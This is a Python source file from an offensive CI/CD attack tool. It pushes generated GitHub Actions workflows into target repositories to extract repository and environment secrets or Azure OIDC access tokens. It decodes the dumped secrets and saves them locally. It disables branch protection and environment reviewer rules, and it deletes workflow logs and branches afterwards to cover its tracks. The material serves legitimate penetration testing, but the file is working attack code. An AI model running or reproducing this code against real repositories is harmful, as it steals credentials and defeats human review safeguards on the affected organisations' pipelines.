import logging
import base64
from zipfile import ZipFile
from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.yaml.github import WorkflowGenerator
from nordstream.utils.errors import GitHubError
from nordstream.git import *


class GitHubWorkflowRunner:
    _cicd = None
    _taskName = "2_command.txt"
    _workflowFilename = "init_ZkITM.yaml"
    _fileName = None
    _env = None
    _extractRepo = True
    _extractEnv = True
    _yaml = None
    _exploitOIDC = False
    _tenantId = None
    _subscriptionId = None
    _clientId = None
    _forceDeploy = False
    _disableProtections = None
    _writeAccessFilter = False
    _branchAlreadyExists = False
    _pushedCommitsCount = 0

    def __init__(self, cicd, env):
        self._cicd = cicd
        self._env = env
        self.__createLogDir()

    @property
    def extractRepo(self):
        return self._extractRepo

    @extractRepo.setter
    def extractRepo(self, value):
        self._extractRepo = value

    @property
    def extractEnv(self):
        return self._extractEnv

    @extractEnv.setter
    def extractEnv(self, value):
        self._extractEnv = value

    @property
    def workflowFilename(self):
        return self._workflowFilename

    @workflowFilename.setter
    def workflowFilename(self, value):
        self._workflowFilename = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = value

    @property
    def exploitOIDC(self):
        return self._exploitOIDC

    @exploitOIDC.setter
    def exploitOIDC(self, value):
        self._exploitOIDC = value

    @property
    def tenantId(self):
        return self._tenantId

    @tenantId.setter
    def tenantId(self, value):
        self._tenantId = value

    @property
    def subscriptionId(self):
        return self._subscriptionId

    @subscriptionId.setter
    def subscriptionId(self, value):
        self._subscriptionId = value

    @property
    def clientId(self):
        return self._clientId

    @clientId.setter
    def clientId(self, value):
        self._clientId = value

    @property
    def disableProtections(self):
        return self._disableProtections

    @disableProtections.setter
    def disableProtections(self, value):
        self._disableProtections = value

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    @property
    def branchAlreadyExists(self):
        return self._branchAlreadyExists

    @branchAlreadyExists.setter
    def branchAlreadyExists(self, value):
        self._branchAlreadyExists = value

    @property
    def pushedCommitsCount(self):
        return self._pushedCommitsCount

    @pushedCommitsCount.setter
    def pushedCommitsCount(self, value):
        self._pushedCommitsCount = value

    @property
    def forceDeploy(self):
        return self._forceDeploy

    @forceDeploy.setter
    def forceDeploy(self, value):
        self._forceDeploy = value

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/github"
        makedirs(self._cicd.outputDir, exist_ok=True)

    @staticmethod
    def __createWorkflowDir():
        makedirs(".github/workflows", exist_ok=True)

    def __extractWorkflowOutput(self, repo):
        name = self._fileName.strip(".zip")
        with ZipFile(f"{self._cicd.outputDir}/{repo}/{self._fileName}") as zipOutput:
            zipOutput.extractall(f"{self._cicd.outputDir}/{repo}/{name}")

    def __extractSensitiveInformationFromWorkflowResult(self, repo, informationType="Secrets"):
        name = self._fileName.strip(".zip")
        with open(f"{self._cicd.outputDir}/{repo}/{name}/init/{self._taskName}", "r") as output:
            # well it's working
            data = output.readlines()[-1].split(" ")[1]

            try:
                secrets = base64.b64decode(base64.b64decode(data))
            except Exception as e:
                logger.exception(e)
        logger.success(f"{informationType}:")
        logger.raw(secrets, logging.INFO)

        with open(f"{self._cicd.outputDir}/{repo}/{informationType.lower().replace(' ', '_')}.txt", "ab") as file:
            file.write(secrets)

    def __getWorkflowOutput(self, repo):
        name = self._fileName.strip(".zip")
        with open(f"{self._cicd.outputDir}/{repo}/{name}/init/{self._taskName}", "r") as output:
            logger.success("Workflow output:")
            line = output.readline()
            while line != "":
                logger.raw(line, logging.INFO)
                line = output.readline()

    def createYaml(self, repo):
        repo = self._cicd.org + "/" + repo

        if self._env:
            try:
                secrets = self._cicd.listSecretsFromEnv(repo, self._env)
            except GitHubError as e:
                # FIXME: Raise an Exception here
                logger.exception(e)
        else:
            secrets = self._cicd.listSecretsFromRepo(repo)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets, self._env)

            logger.success("YAML file: ")
            workflowGenerator.displayYaml()
            workflowGenerator.writeFile(self._workflowFilename)
        else:
            logger.info("No secret found.")

    def __extractSecretsFromRepo(self, repo):
        logger.info(f'Getting secrets from repo: "{repo}"')
        secrets = []

        try:
            secrets = self._cicd.listSecretsFromRepo(repo)
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets)
            if self.__launchWorkflow(repo, workflowGenerator, "repo"):
                self.__extractSensitiveInformationFromWorkflowResult(repo)
            logger.empty_line()

        else:
            logger.info("No secret found")

    def __extractSecretsFromSingleEnv(self, repo, env):
        logger.info(f'Getting secrets from environment: "{env}" ({repo})')
        secrets = []

        try:
            secrets = self._cicd.listSecretsFromEnv(repo, env)
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets, env)
            policyId = waitTime = reviewers = branchPolicy = None

            try:
                if not self._forceDeploy:
                    (
                        policyId,
                        waitTime,
                        reviewers,
                        branchPolicy,
                    ) = self.__checkAndDisableEnvProtections(repo, env)

                if self.__launchWorkflow(repo, workflowGenerator, f"env_{env}"):
                    self.__extractSensitiveInformationFromWorkflowResult(repo)
            except Exception as e:
                logger.error(f"Error: {e}")

            finally:
                if self._disableProtections and policyId:
                    self.__restoreEnvProtections(repo, env, policyId, waitTime, reviewers, branchPolicy)
                logger.empty_line()

        else:
            logger.info("No secret found")

    def __extractSecretsFromAllEnv(self, repo):
        for env in self._cicd.listEnvFromrepo(repo):
            self.__extractSecretsFromSingleEnv(repo, env)

    def __extractSecretsFromEnv(self, repo):
        if self._env:
            self.__extractSecretsFromSingleEnv(repo, self._env)
        else:
            self.__extractSecretsFromAllEnv(repo)

    def __launchWorkflow(self, repo, workflowGenerator, outputName):
        logger.verbose(f"Launching workflow.")

        workflowGenerator.writeFile(f".github/workflows/{self._workflowFilename}")

        pushOutput = gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if pushOutput.returncode != 0 or pushOutput.communicate()[1].strip() == b"Everything up-to-date":
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
            else:
                self._pushedCommitsCount += 1

                logger.raw(pushOutput.communicate()[1])
                workflowId, workflowConclusion = self._cicd.waitWorkflow(repo, self._workflowFilename)

                if workflowId and workflowConclusion == "success":
                    logger.success("Workflow has successfully terminated.")
                    self._fileName = self._cicd.downloadWorkflowOutput(
                        repo,
                        f"{outputName.replace('/','_').replace(' ', '_')}",
                        workflowId,
                    )
                    self.__extractWorkflowOutput(repo)
                    return True
                elif workflowId and workflowConclusion == "failure":
                    logger.error("Workflow failure:")
                    for reason in self._cicd.getFailureReason(repo, workflowId):
                        logger.error(f"{reason}")
                    return False
                else:
                    return False
        except Exception as e:
            logger.exception(e)
        finally:
            pass

    def listGitHubRepos(self):
        logger.info("Listing all repos:")
        for r in self._cicd.repos:
            logger.raw(f"- {r}\n", level=logging.INFO)

    def listGitHubSecrets(self):
        logger.info("Listing secrets:")
        for repo in self._cicd.repos:
            try:
                self.__displayRepoSecrets(repo)
                self.__displayEnvSecrets(repo)
            except Exception:
                logger.error("Need write acccess on the repo.")

    def __displayRepoSecrets(self, repo):
        secrets = self._cicd.listSecretsFromRepo(repo)
        if len(secrets) != 0:
            logger.info("Repo secrets:")
            for secret in secrets:
                logger.raw(f"\t- {secret}\n", logging.INFO)

    def __displayEnvSecrets(self, repo):
        envs = self._cicd.listEnvFromrepo(repo)
        for env in envs:
            secrets = self._cicd.listSecretsFromEnv(repo, env)
            if len(secrets) != 0:
                logger.info(f"{env} secrets:")
                for secret in secrets:
                    logger.raw(f"\t- {secret}\n", logging.INFO)

    def getRepos(self, repo):
        if repo:
            if exists(repo):
                with open(repo, "r") as file:
                    for repo in file:
                        self._cicd.addRepo(repo.strip())

            else:
                self._cicd.addRepo(repo)

        else:
            self._cicd.listRepos()
        if self._writeAccessFilter:
            self._cicd.filterWriteRepos()

        if len(self._cicd.repos) == 0:
            logger.critical("No repository found.")

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for repo in self._cicd.repos:
            self._cicd.cleanAllLogs(repo, self._workflowFilename)

    def manualCleanBranchPolicy(self):
        logger.info("Deleting deployment branch policy")
        for repo in self._cicd.repos:
            self._cicd.deleteDeploymentBranchPolicyForAllEnv(repo)

    def __runCustomWorkflow(self, repo):
        logger.info(f"Running custom workflow: {self._yaml}")

        workflowGenerator = WorkflowGenerator()
        workflowGenerator.loadFile(self._yaml)

        policyId = waitTime = reviewers = branchPolicy = None

        try:
            if self._env and not self._forceDeploy:
                (
                    policyId,
                    waitTime,
                    reviewers,
                    branchPolicy,
                ) = self.__checkAndDisableEnvProtections(repo, self._env)

            if self.__launchWorkflow(repo, workflowGenerator, "custom"):
                self.__getWorkflowOutput(repo)
        except Exception as e:
            logger.error(f"Error: {e}")

        finally:
            if self._env and self._disableProtections and policyId:
                self.__restoreEnvProtections(repo, self._env, policyId, waitTime, reviewers, branchPolicy)
            logger.empty_line()

    def __runOIDCTokenGenerationWorfklow(self, repo):
        # FIXME: factorize code
        logger.info("Running OIDC access token generation workflow")

        workflowGenerator = WorkflowGenerator()
        workflowGenerator.generateWorkflowForOIDCTokenGeneration(
            self._tenantId, self._subscriptionId, self._clientId, self._env
        )

        policyId = waitTime = reviewers = branchPolicy = None

        try:
            if not self._forceDeploy and self._env:
                (
                    policyId,
                    waitTime,
                    reviewers,
                    branchPolicy,
                ) = self.__checkAndDisableEnvProtections(repo, self._env)

            if self.__launchWorkflow(repo, workflowGenerator, "oidc"):
                self.__extractSensitiveInformationFromWorkflowResult(repo, informationType="OIDC access tokens")
        except Exception as e:
            logger.error(f"Error: {e}")

        finally:
            if not self._forceDeploy and self._env and self._disableProtections:
                self.__restoreEnvProtections(repo, self._env, policyId, waitTime, reviewers, branchPolicy)
            logger.empty_line()

    def __runSecretsExtractionWorkflow(self, repo):
        if self._extractRepo:
            self.__extractSecretsFromRepo(repo)

        if self._extractEnv:
            self.__extractSecretsFromEnv(repo)

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        # gitCleanRemote(self._cicd.branchName)
        deleteOutput = gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)

    def __clean(self, repo):
        self._cicd.cleanAllLogs(repo, self._workflowFilename)
        if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
            gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
        else:
            self.__deleteRemoteBranch()

    def runWorkflow(self):
        for repo in self._cicd.repos:
            logger.success(f'"{repo}"')

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = gitRemoteBranchExists(self._cicd.branchName)
            gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                if not self._forceDeploy:
                    self.__checkAndDisableBranchProtectionRules(repo)
                self.__createWorkflowDir()

                if self._yaml:
                    self.__runCustomWorkflow(repo)
                elif self._exploitOIDC:
                    self._taskName = "3_commands.txt"
                    self.__runOIDCTokenGenerationWorfklow(repo)
                else:
                    self.__runSecretsExtractionWorkflow(repo)

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:
                self.__clean(repo)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

        logger.info(f"Check output: {self._cicd.outputDir}")

    def __checkAllEnvSecurity(self, repo):
        for env in self._cicd.listEnvFromrepo(repo):
            self.__checkSingleEnvSecurity(repo, env)

    @staticmethod
    def __displayEnvSecurity(envDetails):
        protectionRules = envDetails.get("protection_rules")
        envName = envDetails.get("name")

        if len(protectionRules) > 0:
            logger.info(f'Environment protection for: "{envName}":')
            for protection in protectionRules:
                if protection.get("type") == "required_reviewers":
                    for reviewer in protection.get("reviewers"):
                        reviewerType = reviewer.get("type")
                        login = reviewer.get("reviewer").get("login")
                        userId = reviewer.get("reviewer").get("id")
                        logger.raw(
                            f"\t- reviewer ({reviewerType}): {login}/{userId}\n",
                            logging.INFO,
                        )
                elif protection.get("type") == "wait_timer":
                    wait = protection.get("wait_timer")
                    logger.raw(f"\t- timer: {wait} min\n", logging.INFO)
                else:
                    branchPolicy = envDetails.get("deployment_branch_policy")
                    if branchPolicy.get("custom_branch_policies"):
                        logger.raw(f"\t- deployment branch policy: custom\n", logging.INFO)
                    else:
                        logger.raw(f"\t- deployment branch policy: protected\n", logging.INFO)
        else:
            logger.info("No environment protection rule found")

    def __checkSingleEnvSecurity(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        self.__displayEnvSecurity(envDetails)

    def _checkBranchProtectionRules(self, repo):
        protectionEnabled = False

        try:
            protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
        except GitHubError:
            pass

        if not protectionEnabled:
            gitCreateEmptyFile("test_push.md")
            pushOutput = gitPush(self._cicd.branchName)
            pushOutput.wait()

            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
            else:
                self._pushedCommitsCount += 1

            try:
                protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
            except GitHubError:
                pass
        return protectionEnabled

    @staticmethod
    def _displayBranchProtectionRules(protections):
        logger.info("Branch protections:")

        if protections.get("required_pull_request_reviews"):
            logger.raw(
                "\t- required pull request reviews:"
                f' {protections.get("required_pull_request_reviews").get("enabled", True)}\n',
                logging.INFO,
            )
        else:
            logger.raw(f"\t- required pull request reviews: False\n", logging.INFO)
        logger.raw(f'\t- restrictions: {"restrictions" in protections}\n', logging.INFO)
        logger.raw(f'\t- required status checks: {"required_status_checks" in protections}\n', logging.INFO)
        logger.raw(
            "\t- required signatures:" f' {protections.get("required_signatures").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            f'\t- enforce admins: {protections.get("enforce_admins").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            "\t- required linear history:" f' {protections.get("required_linear_history").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            "\t- allow force pushes:" f' {protections.get("allow_force_pushes").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            "\t- allow deletions:" f' {protections.get("allow_deletions").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            "\t- block creations:" f' {protections.get("block_creations").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            "\t- required conversation resolution:"
            f' {protections.get("required_conversation_resolution").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            f'\t- lock branch: {protections.get("lock_branch").get("enabled")}\n',
            logging.INFO,
        )
        logger.raw(
            "\t- allow fork syncing:" f' {protections.get("allow_fork_syncing").get("enabled")}\n',
            logging.INFO,
        )

    def __checkAndDisableBranchProtectionRules(self, repo):
        protectionEnabled = self._checkBranchProtectionRules(repo)

        if protectionEnabled:
            logger.info(f'Found branch protection rule on "{self._cicd.branchName}" branch')
            try:
                protection = self._cicd.getBranchProtectionRules(repo)

                if protection:
                    self._displayBranchProtectionRules(protection)
                else:
                    logger.info("Not enough privileges to display rules")

                if protection and self.disableProtections:
                    logger.info("Removing protection")
                    self._cicd.disableBranchProtectionRules(repo)
                elif self.disableProtections:
                    # if we can't list protection this means that we don't have enough privileges
                    raise Exception("branch protection rule enabled but not enough privileges to disable it.")
                else:
                    raise Exception("branch protection rule enabled but '--disable-protections' not activated")

            except GitHubError:
                pass
        else:
            logger.info(f'No branch protection rule found on "{self._cicd.branchName}" branch')

    def checkBranchProtections(self):
        for repo in self._cicd.repos:
            logger.info(f'Checking security: "{repo}"')
            # TODO: check branch wide protection
            # For now, it's not available in the REST API. It could still be performed using the GraphQL API.
            # https://github.com/github/safe-settings/issues/311
            protectionEnabled = False

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = gitRemoteBranchExists(self._cicd.branchName)
            gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                self.__checkAndDisableBranchProtectionRules(repo)
            except Exception:
                pass
            finally:
                self.__clean(repo)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

            self.__checkAllEnvSecurity(repo)

    def __checkAndDisableEnvProtections(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        protectionRules = envDetails.get("protection_rules")
        branchPolicy = envDetails.get("deployment_branch_policy")
        waitTime = 0
        reviewers = []
        policyId = None

        if len(protectionRules) > 0 and self._disableProtections:
            self.__displayEnvSecurity(envDetails)

            try:
                logger.info("Modifying protections")
                if branchPolicy:
                    policyId = self._cicd.createDeploymentBranchPolicy(repo, env)

                for protection in protectionRules:
                    if protection.get("type") == "required_reviewers":
                        for reviewer in protection.get("reviewers"):
                            reviewers.append(
                                {
                                    "type": reviewer.get("type"),
                                    "id": reviewer.get("reviewer").get("id"),
                                }
                            )
                    if protection.get("type") == "wait_timer":
                        waitTime = protection.get("wait_timer")

                self._cicd.modifyEnvProtectionRules(repo, env, 0, [], branchPolicy)
            except GitHubError:
                raise Exception("Environment protection rule enabled but not enough privileges to disable it.")

        elif len(protectionRules) > 0 and not self._disableProtections:
            self.__displayEnvSecurity(envDetails)
            raise Exception("Environment protection rule enabled but '--disable-protections' not activated")
        else:
            logger.verbose("No environment protection rule found")

        return policyId, waitTime, reviewers, branchPolicy

    def __restoreEnvProtections(self, repo, env, policyId, waitTime, reviewers, branchPolicy):
        logger.info("Restoring protections")
        if policyId is not None:
            self._cicd.deleteDeploymentBranchPolicy(repo, env)
        self._cicd.modifyEnvProtectionRules(repo, env, waitTime, reviewers, branchPolicy)
